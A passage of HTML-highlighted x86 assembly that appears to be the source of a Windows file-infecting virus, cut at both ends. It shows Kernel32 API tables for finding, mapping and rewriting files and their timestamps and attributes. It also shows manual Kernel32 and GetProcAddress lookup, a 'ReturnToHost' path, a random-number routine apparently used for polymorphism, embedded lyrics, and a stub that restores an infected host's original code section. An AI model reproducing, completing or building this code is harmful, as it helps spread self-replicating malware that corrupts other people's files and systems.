          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrlen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FlushViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetLastError"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IsBadReadPtr"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">k32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_ExitProcess</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetDriveTypeA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_lstrlen</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_SetFileTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetFileTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_FlushViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetLastError</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetSystemTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_SetFileAttributes</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_IsBadReadPtr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">u32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">u32_API_addrs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">_MessageBoxA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">k32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">kernel32_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Kernel32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">user32_name</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">getmodulehandle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">getmodulehandlelen</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getmodulehandle</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">getprocaddress</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">getprocaddresslen</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getprocaddress</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">increment</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">iterations</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">jumper</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">FindNeededStuff</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExceptionExit</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нSetup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfirst let's locate the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_name</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нkernel32 base address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateKernel32</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;нsave it...</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getprocaddress</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;нthen let's locate</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateGetProcAddress</span><span class="sc0">           </span><span class="sc1">;нGetProcAddress</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;нnow let's locate all</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нthe K32 apis we need</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нfurthure...</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_name</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;нLocate USER32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">               </span><span class="sc1">;нmodule base</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">u32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нand the corresp.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">u32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нAPI addresses</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FinishedLocatingStuff</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Randomize</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нinitialize the random</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нnumber generator</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">random32</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">rloop</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">197</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rloop</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BFF81234h</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">brandom32</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;нthis procedure gets</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;нa random value in eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;нbetween 0 and ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'The world is full of kings and queens'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'That blind your eyes and steal your dreams'</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'It''s HEAVEN and HELL!!!'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">relocating_code</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;нthis part will restore</span><span class="sc0">
</span><span class="sc5">@7</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нthe original code sec.</span><span class="sc0">
